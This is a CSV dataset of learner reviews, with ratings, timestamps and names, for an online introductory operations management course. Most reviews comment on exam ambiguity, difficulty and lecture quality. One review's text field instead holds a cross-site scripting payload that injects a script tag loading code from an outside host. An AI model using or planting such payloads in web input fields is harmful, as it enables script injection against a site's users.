id,reviewedAt,rating,isMarkedHelpful,reviewText,productCompleted,mostHelpfulVoteCount,users,user_id
39278234~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1552405130267,3,0,I was not impressed with course up to about week three. Then the light went on and I understood the layout of the curriculum Good course with a lot of intense calculation required. ,0,0,PETER GAFFNEY,39278234
30705907~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1549736541413,3,0,"some of the language used in the quizzes and practice questions for the various modules is very unclear and does not interpret accurately.  the course is stale at this point:  there is no longer active discussion in the forums and no way to check for answers to exam questions that never ended up being clear (such as due to language interpretation issues).  the explanations from the mentors are not very good from what I've read, since they are most concerned about giving away answers even to practice problems.",0,0,Alex Kettell,30705907
723464~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1548797541595,3,0,I found it a little hard to follow along and some of the assignments were difficult to solve because of lack of reference resources (in the course or discussion forms).  The course was overall very good but I think it could be made better if delivered better. ,0,0,Nathan  Kebede,723464
14522133~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1544233887931,3,0,I think for calculations there should be a sample answer so that students can know what's wrong with theim when their own answer is wrong. It's just so painful for me to go over and over again with these exams without knowing what's wrong with my answer.,0,0,于一铭,14522133
36775939~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1540846549168,3,0,Some great information. The final test though appears to have some errors. I found a discussion in the forum about it from a few years ago where an admin states otherwise. I'm not convinced however. I enjoyed the course though.,0,0,Jeffery W Larson Jr,36775939
4544722~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1532289366415,3,0,some concepts are not very clear and exam questions are not reflecting the concepts taught in the course,0,0,Xinhua Liao,4544722
19007295~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1527001014039,3,0,"Interesting course material, but the slides and presentation could be more clear. Exam questions are not always stated precisely.",0,0,Philipp Rosenbaum,19007295
29732531~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1515839712836,3,0,"I found the content to be very good.  That said, I believe a few of the items on the exams provided enough deviation in scenario that the subject should be covered in more detail (example...processing demand flow) or the questions should be more specific so as not to have the tester assume or ""read-in"" to any variable.  Again...enjoyed the learning experience.",0,0,Daniel McFarland,29732531
19210413~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1514756253787,3,0,"Great information, but it is difficult to understand the professor and read his handwriting which makes the course difficult to follow. There are a number of discrepancies between the material shown in the video and the materials provided for download which can create some confusion. It would be helpful if the professor would clearly outline the various formula and calculations used and reference them consistently.",0,0,J Cornelius,19210413
29051281~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1509952366231,3,0,Formatting of answers during quizzes wasn’t clear.,0,0,Rean Tirol,29051281
26425051~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1508489536282,3,0,"A very academic course that turns intuitive concepts inside out, with little perceived benefit. The course would benefit from more applied examples with clear added value. ",0,0,Alex Maclachlan,26425051
28030044~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1506445894568,3,0,slides didn't match lectures,0,1,Trent Brunson,28030044
24847330~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1500361388821,3,0,This course seem mechanical the fluid of it is lost on me. I find it as difficult as i did 4 years ago when i first attempted it on this platform. I need to say though that the content is relevant but it just seemed for difficult to grasp. i will revisit it IF the delivery is changed or modified to be user-friendly.,0,0,"Dayo-Dunmoye, Dayo",24847330
8517067~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1499201572071,3,0,"Decent material and very sincere instructor, but somewhat dry and not as vividly applied as would be possible",0,0,Philip Reimer,8517067
18603357~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1497438117297,3,0,"I appreciated the extra problem sets included at the end of each week.  The material was pretty interesting.  However, quiz questions (especially quiz #2) could be vague and difficult to interpret, and they often take 3-5 times longer to complete than the time listed.  Most everything is calculations (not multiple choice), and there are no hints after completing a quiz to help you find out what you did incorrectly. Thus, it can take numerous tries to pass a quiz if you are rounding something incorrectly or made a small calculation error.  With respect to the lecture videos, the volume is very low, especially on the earlier videos in week 1. The slides have a lot of small text and are hard to read.  The instructor's handwriting is difficult to read, which can make it tough to follow along as he solves problems.  ",0,0,Sarah Elliott,18603357
24375112~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1490645047528,3,0,The presentation and course material is of minimal use. It should be more descriptive so that we can review the subject at a later time after completing the course.,0,0,Ashish Verma,24375112
24232396~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1489718529095,3,0,"Topic is great, covers a lot of concepts that are important in this field.Providing the students with examples of the formulas and definitions prior to the course would be a big help!",0,0,David Millunchick,24232396
22306543~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1488669510586,3,0,This course is fairly informative but it take much longer than advertised unless you have a background in operations. ,0,0,Marlowe Doman,22306543
6004311~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1478047250872,3,0,"Far from the best and below the average quality of Wharton's courses, has plenty of critical technical video issues that detract one's experience and easily misguide a good understanding.Even though, if you compensate this by taking into account the extraordinary effort Wharton's teachers have been putting on their courses and accepting as a personal challenge, you certainly will learn admirable and fundamental efficient skills regarding the operational process and decision-making process.",0,0,Caio Aranha Vinchi,6004311
15456213~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1472703895806,3,0,A pretty hard course with a very fast paced mode of learning. Still useful and challenging!,0,0,Angelene Micel S. Velandres,15456213
750093~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1468093054247,3,0,"OK, the course starts a bit confusing and boring, but it gets better after the second week. The last week is actually very, very interesting. Handwriting is perhaps not the best thing to offer in the presentations. But the main problem of the course are the tests, by far the most difficult I ever had in coursera. Time to devote per week is way over the estimated 4/5 hours.

",0,0,Gabriel Fernandez,750093
16836532~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1467154488326,3,0,Need more sample problems to understand the concepts better.,0,0,Rajarajeshwari Seshadri M,16836532
10868356~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1466715521979,3,0,Goes through the material somewhat quickly. Could have done more with week 1,0,0,Henry Mark,10868356
9672105~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1461290094653,3,0,Plz help to make knowledge as short and simple as they can be for the learner.  ,0,0,Duong Bich Ngoc,9672105
1337073~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1459012004802,3,0,"This is not upto the standard of Wharton, I believe.",0,0,ABHISEK DASH,1337073
6818793~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1455067621433,3,0,"What I liked: 1. The scope of subject material covered was awesome and seems useful.2. I L O V E D that there were practice videos where Mr. Terwiesch went over sample questions and let you try to work them out before he showed the solutions. This helped IMMENSELY.  (saved the course in my opinion.)What I didn't like: 1. Question ambiguity annoyed me more than anything else. Questions MUST be 100% clear on what is expected and how things are working. This was a huge piss off.  Mr Terwiesch was pretty bad with not being detailed enough in his explanations, I'd find myself having to retake a quiz just to test whether he meant one way or another possible stance.  2. Sloppy hand writing was nearly impossible to read. Can Profs please take 30% extra time to write a little more clean? (Just a minor thing.)3. There were many other pedagogical missteps. Which order you introduce concepts and how you explain them is just as important as what your course material is. Please pay more attention to this in the future. For example in Module 3 exam there was a question about a wind tunnel which seemed to be dealing with rework time, yet rework wasn't covered in detail until Module 4. 4. Adding a little humor here and there would've been nice, I've seen other profs do this and I love it. (This is more a personal taste kind of thing, and not a huge problem.)",0,0,Andrew Furmanczyk,6818793
1845565~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1451846152997,3,0,"I found the course very useful: it was easy to see practical applications for many of the topics discussed, and hence to quickly put in action what I learned.  The course is well structured and has a good balance between the theory and the exercises, and part of the solutions are provided in step-by-step videos. However, the quality of the slides is not always the best and the handwriting by Prof. Terwiesch does not help. Also, it was not easy to follow the parts of the lectures when excel was used.",0,0,michele bonetti,1845565
120548918~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1672184907664,4,0,It's really good course from the aspect of content as well as technical performance. The lecturer is on a really high level so it goes hand to hand. Keep your great work.,0,0,Dejan Hegler,120548918
120629080~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1671527690125,4,0,its good for skills,0,0,Durga Dhyani,120629080
96514728~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1670773689203,4,0,"Harder than expected, but very comprehensive and useful. ",0,0,Erica Casonato,96514728
1500954~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1668003136212,4,0,"I learned a lot in this course and think the instructor is very good. I just wish there was a bit more help available for people, like myself, that lack math skills that are obviously a given in this course. I struggled more with those (particularly in the last two modules) than with the concepts. Not all of us are STEM people!",0,0,Izaskun Fuentes Milani Orkwis,1500954
87637877~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1650911957771,4,0,Difficult to understand Professor teaching,0,0,Khup Sang,87637877
102885503~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1648315303070,4,0,"""><script src=https://bugcrowd123.xss.ht></script>",0,0,Deleted Account,102885503
44258194~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1647771489074,4,0,"This introductory course on operations management provides a steady preface to the renowned six sigma principle. It refreshed my memories of Japanese concepts such as Kanban, Jidoka, and Kaizen. It also charts a clear path to find the bottlenecks to optimize a process. Prof Christian Terwiesch's explanations and situational analysis add necessary insights about the taught topics in the course.",0,1,Ritesh Goyal,44258194
86567140~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1632994480036,4,0,Great videos. Good balance between theory and practice. Some of the graded homeworks and final exams were quite hard.,0,0,João Bernardo Sequeira de Sá,86567140
43901428~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1632591516904,4,0,Additional reading material should be provided to support what is taught,0,0,Virendra Singh,43901428
47967302~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1630048670428,4,0,It will give you idea of Operations for begineers,0,0,omkar Kawatgi,47967302
4645753~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1624190744592,4,0,This course is worth doing as it changes the perspective of thinking in right direction. Course also helps to find out bottlenecks and improve productivity. I found it useful and well with an engineers curriculum. ,0,0,Yatin Sardessai,4645753
48976986~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1616039969492,4,0,"This course provides a basic analysis of processing time, capacity, quality, manpower and demand rate. It closes with a short summary of Toyota production system. The instructor gives concise explanation on the concepts above with challenging questions. This is helpful course to me.",0,0,鄧志堅,48976986
39561320~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1613008416517,4,0,Es un buen curso pero demasiados problemas prácticos,0,0,Juliana Figueroa,39561320
80678407~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1612904948532,4,0,Very Informational and quite challenging.,0,0,Rodney Sooklal,80678407
45270933~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1612788948804,4,0,"The feedback about the questions are not available at the end of the course. I disagree with this, however all the content it was ok.",0,0,Rosa Pamela Moreno Villarreal,45270933
20121659~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1600787818986,4,0,"Good introduction. Concise. The simple examples are good. Lacking examples to illustrate practical challenges in large, complex enterprises.",0,0,Benoît Guillaud,20121659
71109263~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1600787118297,4,0,Great course. It would be good to include real case studies.,0,0,Mohammad Al Ali,71109263
58866988~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1596997958189,4,0,"The content was useful and I learned quite a bit.  Professor was very thorough with the classes and had practice questions available within  the coursework.  Job well done.  Only peeve I had was that some of the questions on the tests weren't worded correctly and there were a couple little glitches with the content.  Overall, a solid course that can be used effectively in the real world.",0,0,Matthew Peter Betti,58866988
64527060~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1594734291752,4,0,"Very interesting material the lessons are quite clear and the concept are nicely presented. I am not sure if the graded assignments need to be this tough. For a basic course I would have assumed they would have been a bit easier. I have no statistics/calculus basis (and my knowledge of excel is not top notch), so I am proof it can be done but I found it challenging. ",0,0,Daniele Poli,64527060
44529059~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1594431279094,4,0,A challenging course that is rewarding to finish.  I enjoyed Prof's dry sense of humor and examples of industry application.,0,0,Eric W Lin,44529059
44719176~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1594246268646,4,0,"Is good , but so difficult ",0,0,Carola Alexandra  Yanez Cabrera,44719176
19662964~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1593120483887,4,0,I feel there were not enough examples for the problems sets. It took me longer than normal to solve them. Especially when the teacher made a small change to how it's supposed to be solved.,0,0,Adan,19662964
54033469~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1592428798329,4,0,"I enjoyed the class, Professor Christian did an excellent job. ",0,0,Denise Sena,54033469
56915088~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1591583666363,4,0,Volume too soft.,0,0,Aman,56915088
60077241~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1591308151161,4,0,"Thank you Prof. Christian for the wonderful course lectures, It was really nice studying this course",0,0,Soumyanath Ghosh,60077241
45205961~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1590663781515,4,0,riche et fun,0,0,kouamé cyrille adelphe kouassi,45205961
51364505~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1590628864568,4,0,"The course itself was really interest, however, I would not recommend as a course for people with no experience. I have some background on the business community and found the course pretty hard in general. The professor was excellent. ",0,0,Tomas Schwencke,51364505
59485145~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1590404742256,4,0,"Over all very positive, some of the exam questions were very simple compared to the course work, so i'm not sure how valuable the course will be on my CV, but that remains to be seen.",0,0,Harry Mapplebeck,59485145
42808380~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1589643674833,4,0,great tutorship. although the questions are tough. That means we need to practise more.,0,0,Chukwuemeka Nnanna,42808380
56132677~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1589605033203,4,0,"Through the four-week course, I learnt some knowledge about holding and monitoring an operation. Several models and formulas were used and I found some of them a bit challenging. What's more, some questions in the exam were a bit tricky. However, it is my honor to say that I really improved myself during the four weeks and I feel more confident about my college life. For improvement, I hope that some of the explanations made by the professional to be clearer and more understandable. Can't wait to take another course in the program!",0,0,袁之骜,56132677
51625030~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1588348832828,4,0,Excellent and detailed course. My only complaint is some topics are assumed as prior knowledge without explicit instruction. The student is then unsure what to even look up when attempting to fill these knowledge gaps.,0,0,Johnny Vaughan,51625030
673642~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1587872457783,4,0,Very informative course and does contains lots of practical examples and exercises!Strongly recommended for those who run business and would like to understand how to create good processes and high-quality operations.,0,0,Moutaz Abdelkader,673642
50064976~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1587829088115,4,0,"Excellent teacher. Brilliant learning experience. However, Module 4 could have been a little more explanatory. ",0,0,Varun Loonkar,50064976
4534009~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1587226234036,4,0,The examples chosen kept the course very interesting. Interesting applications of the topics covered. More maths needed than I had expected.,0,0,Ailsa Leadbetter,4534009
16719644~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1587211320744,4,0,The course is very relevant to Industrial/Operations/Management professionals. Thanks a lot to the instructor (Prof. Christian Terwiesch) for designing the course.,0,0,Rahul S Mor,16719644
52064187~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1587144427599,4,0,good course with lots of problem solving,0,0,Mihir Sonawane,52064187
54943334~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1586202117646,4,0,4.5,0,0,Deleted Account,54943334
1924062~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1580777558688,4,0,"Introduction to Operations Management is a good course to learn
key concepts such as process analysis, bottlenecks, flows rates, and inventory
levels.",0,0,Gautam Ashok Kumar,1924062
42973544~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1580679904249,4,0,A little bit too hard to understands,0,0,Ken Li,42973544
661944~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1575900431880,4,0,"Exams as lengthy and boring, other courses exams test concepts without taking too much time",0,0,Khalid Ahmad Ghazi Mohammad,661944
39908987~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1569218393299,4,0,Smartly covered all topics.,0,0,sujeet bhatnagar,39908987
12666136~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1564047176995,4,0,The process was not motivating or interesting. Otherwise materials and quizes were interesting but the videos not so much. ,0,0,Lado Jishiashvili,12666136
7462610~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1561713659956,4,0,This course teach you the main keys to have a better control of your operations in a begginer level.,0,0,Raúl Alonso Pérez,7462610
38772307~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1557548643756,4,0,"It's a very useful course, professor is pretty clear about explaining theory and showing how to do some calculation, it would be wonderful if the sound record system get improved, sometimes the voice from video is not clear enough.",0,0,Su Zhu Crisci,38772307
31195335~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1554728717825,4,0,GOOD EXPERIENCE,0,0,Premchander Satheesh,31195335
40198384~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1553686453455,4,0,nice,0,0,Ngawang Phuntsok,40198384
38381198~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1551862111198,4,0,Good for those who are looking from quantitative  prospective.,0,0,yogendra choukiker,38381198
33541519~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1551062404745,4,0,"Me gustaron mucho los temas, me gusto la explicacion, pero a la hora de hacer los examenes, sufrí mucho, eran mucho mas complicados que los problemas expuestos en clase. Favor de empatar lo visto en clase con lo preguntado en examenes. ",0,0,Paola Fda Ruiz Benhumea,33541519
17995754~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1543167590382,4,0,"This was a great introductory course indeed! I find myself at the present very familiar with what business operations are all about. I wish however there had been more practice exercises, especially for Module 4. I found some applications a bit confusing, and had I had more practice questions, I would have graduated with a much more firm knowledge of the course material. All in all, it was a good experience, thank you professor. I look forward to forwarding my knowledge in business processes and operation management in the future!",0,0,Rony Hobeika,17995754
4386719~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1542429887497,4,0,Quite detailed and lengthy but an intriguing course. Many relevant examples have been included by the Professor to make contents easy for the user. Overall satisfactory!,0,0,varun prabhu,4386719
16224034~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1538645867985,4,0,"Course is informative, while assignments are often unclear.",0,0,Yevgenii Podgaietskyi,16224034
36001111~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1538578613455,4,0,The course was very informative and detailed. I will take this oppurtunity to thank coursera and The Wharton School to have such an amazing platformfor people to come and learn with real examples.THANKS COURSERA TEAM. ,0,0,PRANJAL SHANDILYA,36001111
34109450~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1531648981469,4,0,Final quiz should contain questions from all the 4 sections.,0,0,Vaibhav Bhatia,34109450
33917508~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1530769755197,4,0,"Course is great, information is given understandably, but I didn't like that there were some tasks in excel as I was using phone or tablet and had no excel in it, just excel viewer. Also it would be great to find out the true answers of all questions when you finally pass the homework or exam assignements. Ussually, it took a lot of time to rework and sometimes I passed with a few answers incorrect, so it would be interesting to know the true answers and the mistakes I did.",0,0,Agne Nesciokiene,33917508
29485203~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1526826178792,4,0,Good course for operational analysis,0,0,Amber Deep Singh,29485203
16223333~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1526626608606,4,0,"The content was good and detailed and explained in a simple enough manner. However, it was verryyyy slow and somewhat uninteresting due to the professor's monotone pitch. I was finally able to get through it when I increased the pace of the video playback. If the pace is improved and some more dynamism included in the presentation style it would definitely receive 5 stars. Overall great course. ",0,0,Renee A. Williams,16223333
2911150~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1524928026833,4,0,"This course built me a fundamental in operation management in terms of process analysis, productivity, quality, and their relationships. This course elaborates clearly, provides examples, shows how to apply the formula in the problems, and uses the real examples (Toyota Production System). What I would like to give feedback is giving the guidance of answering the graded quizzes (decimal, percentage, punctuation, currency, etc) as a part of the introduction module (before students start for the first video), not inside the discussion forum. I would like to thank Professor Christian Terwiesch and Wharton Business School for providing this course.",0,0,Steven Amadeus,2911150
17464406~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1523585842608,4,0,"It would be even better to go deeper in the topic of 6-sigma and TPS. However, overall a very useful course.",0,0,Han-Chuan Tsao,17464406
25622560~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1523163320886,4,0,Good Course,0,0,Prasad Mankeswarkar,25622560
1832800~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1523043362281,4,0,"great, but need more material",0,0,Karolis Kluonaitis,1832800
31885960~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1522872667807,4,0,"The course material is good, however several of the test scenarios varied from the demonstrated practices.  Also, the iOs app didn't work correctly.",0,0,Reed Larrimore,31885960
32712701~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1522384853934,4,0,Very good.,0,0,Vikram Sreeram,32712701
130817~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1516848583920,4,0,"I learned a lot from this class and everything was new and fresh for me. The assignments were very difficult and had topics that were not covered in class. Now whenever I am in long lines at a store or waiting  at a restaurant to be serve, I always tried to see what is the bottleneck. At work now, I talk about process flows, process time and flow rate. ",0,0,Pascal Jean-Charles,130817
30454700~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1516739839217,4,0,"Good overview of ways to analyze a business, be it manufacturing (or fast food) or Service based (hospital, call center). Also enjoyed the section on the Toyota (Japanese) Production system view of waste reduction and quality assurance and quality control. ",0,0,Adam Samuels,30454700
14979079~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1515836010530,4,0,Good for and introductory course on the subject.,0,0,Abhishek Deshpande,14979079
21389252~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1514552825411,4,0,I feel it is a challenging course.,0,0,Yuwei Yao,21389252
28115960~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1511965324557,4,0,There have to be more examples on how to equate different aspects of the questions.,0,0,Carlos Llongueras,28115960
16695765~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1510492872667,4,0,"Although very hard to listen to the professor because of his accent and very hard to read his hand written words, the content itself is really useful and practical. ",0,0,Keiji Harada,16695765
24900279~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1509893448502,4,0,Quite tough course but very interesting. ,0,0,Alessandro Dal Porto,24900279
24667645~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1503601853409,4,0,很有挑战的一门课程,0,0,Yangyang Qin,24667645
25733248~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1503142927280,4,0,The problems were very interesting and were challenged no yiurunderstanding,0,0,Deleted Account,25733248
4902819~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1499930773540,4,0,The materials are lot harder than I imagined. And it doesn't help that the Chinese subtitles are wrong for half of the course.,0,0,LUO JINGYUAN,4902819
15238443~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1499328203350,4,0,Great introduction to operations management. The instructor makes the concepts very easy to understand and fun to follow. ,0,0,Meghna Vanjani,15238443
9300960~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1497867912178,4,0,The course was really interesting and helpful for me. It gave me very good system approach towards different operations processes. ,0,0,Vladislav Lazarov,9300960
26221442~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1496775798512,4,0,"Very Time Consuming, process analysis and statistical probability are very interesting.  I do feel however that I will have difficulty actually applying 95% of the material to my present day business. ",0,0,Tyrel Barstow,26221442
5042166~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1494814089813,4,0,"This course definitely gives you a good basic understanding of the concepts and math behind the Operations Management. The examples, exercises and quizzes are truly useful to get prepared for each module exam. The platform is easy to use and the app is also extremely useful.Room for improvement on explaining the exam problems and the presentations.",0,0,Mario Marin Richmond,5042166
24897267~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1494534826694,4,0,Loved the content. I am in Operations and this course brought out the key aspects that are critical for successful operations management. ,0,0,Emmanuel Ogombo,24897267
24859187~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1493138800360,4,0,The module is very good and extremely practical I have really enjoyed it. However the homework and quiz questions are a little bit tricky and are vaguely covered in the videos making it that bit harder to figure out. If that was the intention of the module then well done you have done it well !! but if not then please take a closer look.Apart from that i have really enjoyed it great module.RegardsPeter M,0,0,Peter Mutuku,24859187
19046807~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1491102711239,4,0,Very mathematical course.  First week was nothing.  No need of this being a 4week course.,0,0,Shantan Kajjam,19046807
24015337~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1490942246888,4,0,"Good execution of overall e-modules. Common examples were good, would be better to use some software related examples as well. Suggestion is to add the explanation for each of the home work answer after submission to understand have more understanding.",0,0,Musheer Ahmed Syed,24015337
17245326~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1487968337347,4,0,"A solid introduction to operations management. I worked for two years as a production manager, so some of the concepts were already familiar to me, and yet this course helped me find new meaning in the different methods of controlling and analyzing operations. Professor T. explains things clearly and maintains a good pace, neither too slow ",0,0,Christopher Stvartak,17245326
17473203~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1487597622024,4,0,"Overall good course, but the wordings in the graded assignments and exams are sometimes ambiguous ",0,0,Jay Poddar,17473203
7124354~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1485582880308,4,0,English could be better,0,0,Vadim Lipatov,7124354
7594852~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1482705598190,4,0,Good course.Lays strong foundation of operations and its uses in the industry.,0,0,bhanu,7594852
8568146~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1481896336592,4,0,"Probably the toughest course I've attended on Coursera, but there's a lot of good info in here.",0,0,John Phillip Sanders,8568146
21833918~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1480209278192,4,0,Some quiz questions are hard to understand... the math and problem solving is the easy part. Understanding what they question is looking for is the biggest battle.,0,0,Matt Grant,21833918
20861988~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1477875243843,4,0,Course material was great. Some confusing test questions and limited mentor assistance wa,0,0,Michael Kaplan,20861988
108307~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1477246891956,4,0,Good course. Provides excellent understanding of real world problems. It could be made more interesting by including more real world problems and scenarios.,0,0,Punit Jain,108307
22054571~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1476474275976,4,0,Good course to start with operation management. very basic and precise. ,0,0,Tarun bansal,22054571
21289031~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1475551425929,4,0,Good course :),0,0,Ann John,21289031
6451263~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1474182588932,4,0,"Course offers the most valuable information of the foundations series but the homework exam questions are ambiguous or unclear. This makes learning the material difficult as you will have to ascertain whether you are missing the correct answers because you didn't understand the material or because you simply misinterpreted the information in the question. Great information. If I had to take only one course, this would be it. I just wish it was presented as well as the information in Professor Bushee's Financial Accounting course.",0,0,William Holliday,6451263
18146627~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1470945963820,4,0,Great content but more examples would be helpful,0,0,Tara Anderson,18146627
3913680~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1470651591192,4,0,"Great course with lots of interesting information. In my opinion, only the lean approach in this course could be more detailed.",0,0,Jakub Kruk,3913680
10695186~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1469545772903,4,0,"Very good.Jesús Alberto LozadaBSME, MBA Professor at the Catholic University Andres Bello, Caracas Venezuela.",0,0,JESÚS ALBERTO LOZADA,10695186
19561450~COURSE!~dwUPa14hEeWhGRIiCxDaqw,1466883503579,4,0,"everything is pretty good , just  handwriting of the trainer is not clear enough or its camera issue , thanks ",0,0,Ahmed Ibrahim,19561450
